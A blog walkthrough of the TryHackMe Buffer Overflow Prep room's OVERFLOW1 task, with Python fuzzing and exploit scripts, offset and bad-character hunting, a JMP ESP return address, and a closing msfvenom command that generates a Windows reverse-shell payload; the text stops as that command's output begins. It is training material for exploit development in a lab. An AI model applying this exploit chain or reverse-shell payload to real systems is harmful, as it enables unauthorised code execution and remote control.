---
layout: page
title: Buffer Overflow Prep
description: Active box.
img: 
importance: 4
category: TryHackMe
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bofprep/logo.png" title="THM Buffer Overflow Prep Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/bufferoverflowprep">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to take on some Buffer Overflow Prep.  There are 10 different commands that we can try to pop.  Please note, lab set-up will get covered somewhere else.  Note: The THM lab box uses a different set-up.  So, I ripped the binary and dll and solved these on my personal lab.  I won't cover that.  Probably not.

So, let's get started.

<b><u>OVERFLOW1<br /></u></b>

Open up WinDbg and attach the executable.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/attach.png" title="Attach Executable" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use g to tell the program to go.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/g.png" title="Type g" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click the button that looks like a file with the recycle symbol.  You can also use ctrl + shift + f5 to restart the program.  You will need to restart the program every time you crach it.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/restart.png" title="Restart program" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create a python program to socket connect to the service and send it OVERFLOW1 command under normal usage.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
print(s.recv(1024))

s.send(b'OVERFLOW1 aaaa\r\n')
print(s.recv(1024))

s.close() 
```
{% endraw %}

<br />
Update the script that was just create to fuzz the OVERFLOW1 to send increasingly bigger strings to try and find the break size.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

buffers = [b'A']
counter = 100
while len(buffers) < 50:
    buffers.append(b'A' * counter)
    counter += 100

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)

    s.connect((url,port))
    s.recv(1024)

    print('[*] Sending: {size}'.format(size=len(inputBuffer)))
    s.send(b'OVERFLOW1 ' + inputBuffer + b'\r\n')
    s.recv(1024)

    s.close() 
```
{% endraw %}

<br />
Run the script and notice that point that it hangs and gives a time out.

{% raw %}
```python
= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW1/thm-overflow1_0x00.py
[*] Sending: 1
[*] Sending: 100
[*] Sending: 200
[*] Sending: 300
[*] Sending: 400
[*] Sending: 500
[*] Sending: 600
[*] Sending: 700
[*] Sending: 800
[*] Sending: 900
[*] Sending: 1000
[*] Sending: 1100
[*] Sending: 1200
[*] Sending: 1300
[*] Sending: 1400
[*] Sending: 1500
[*] Sending: 1600
[*] Sending: 1700
[*] Sending: 1800
[*] Sending: 1900
[*] Sending: 2000
Traceback (most recent call last):
  File "/home/kali/Documents/thm/bufferoverflowprep/OVERFLOW1/thm-overflow1_0x00.py", line 21, in <module>
    s.recv(1024)
TimeoutError: timed out 
```
{% endraw %}

<br />
Check the EIP to ensure that our 41s are there indicating that we have control of the address.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/firsteip.png" title="Check EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the ESP register to see the rest of our payload.  This is <i>PROBABLY</i> where the payload is going to go.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/firstesp.png" title="First ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to hardcode the breakpoint and add 400 the attack string to make room for the payload.  Run the code again and check EIP.  Sometimes, when you change the size, you change how the program functions.  We need to confirm that we still have EIP.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 2400

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

s.connect((url,port))
s.recv(1024)

print('[*] Sending payload')
s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the ESP to see all of our new As in the ESP register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/secesp.png" title="Check ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msf-pattern_create to generate a string that is unique that can be used to determine the EIP offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
└─$ msf-pattern_create -l 2400 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9 
```
{% endraw %}

<br />
Update the code to include the string that we just generated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# inputBuffer = b'A' * 2400
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

s.connect((url,port))
s.recv(1024)

print('[*] Sending payload')
s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the EIP and note the value that is stored in the register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/seceip.png" title="Get EIP Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the value from EIP in msf-patter_offset to get the offset value.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
└─$ msf-pattern_offset -l 2400 -q 6f43396e
[*] Exact match at offset 1978 
```
{% endraw %}

<br />
Update the code to incorporate the offset value in your attack string.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1978
inputBuffer += b'B' * 4
inputBuffer += b'C' * (2400 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

s.connect((url,port))
s.recv(1024)

print('[*] Sending payload')
s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the code and check the eip.  If you see 42s in the register, it means your offset is correct.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/42eip.png" title="Check the 42s" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Get a list of the badchars (minus \x00) and add it to the code.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1978
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2400 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

s.connect((url,port))
s.recv(1024)

print('[*] Sending payload')
s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the ESP register.  Look at the characters and look for any mangles or drops.  Notice \x07 gets replaced with \x0a\x0d.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/badcharsone.png" title="Badchars Check One" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

Since line feed and carriage return are not \07 it will have to be removed.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x07

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1978
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2400 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

s.connect((url,port))
s.recv(1024)

print('[*] Sending payload')
s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Keep removing any mangled characters and reviewing the ESP.  Eventually, you should have a clean run.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x07\x2e\xa0

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1978
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2400 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

s.connect((url,port))
s.recv(1024)

print('[*] Sending payload')
s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Update the code to remove the badchars and put in a stub for the payload.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x07\x2e\xa0

payload = b'D' * 400

inputBuffer = b'A' * 1978
inputBuffer += b'B' * 4
inputBuffer += payload
inputBuffer += b'C' * (2400 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

s.connect((url,port))
s.recv(1024)

print('[*] Sending payload')
s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Load the narly plugin in WinDBG.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/narly.png" title="Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run !nmod to get a list of the modules and the security associated with them.  We can choose essfunc.dll.  It doesn't have any security associated with it and no bad chars in the address range.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/nmod.png" title="!nmod" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run jmp esp through msf-nasm_shell to get the opcode equivalent.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
└─$ msf-nasm_shell                        
nasm > jmp esp
00000000  FFE4              jmp esp 
```
{% endraw %}

<br />
In WinDBG, search the address range for essfunc.dll looking for jmp esp.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/findaddress.png" title="Find Address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Set a breakpoint and the address that we found.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/setbp.png" title="Set Breakpoint" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the address that we found.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x07\x2e\xa0

payload = b'D' * 400

inputBuffer = b'A' * 1978
inputBuffer += pack('<L',(0x625011af))
inputBuffer += payload
inputBuffer += b'C' * (2400 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

s.connect((url,port))
s.recv(1024)

print('[*] Sending payload')
s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the code and check to see if we hit the breakpoint in WinDBG.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/hitbp.png" title="Hit Breakpoint" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Move the code forward and we should see the 44s from the payload stub.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of1/uset.png" title="See payload" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msfvenom to generate a payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -b '\x00\x07\x2e\xa0' -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
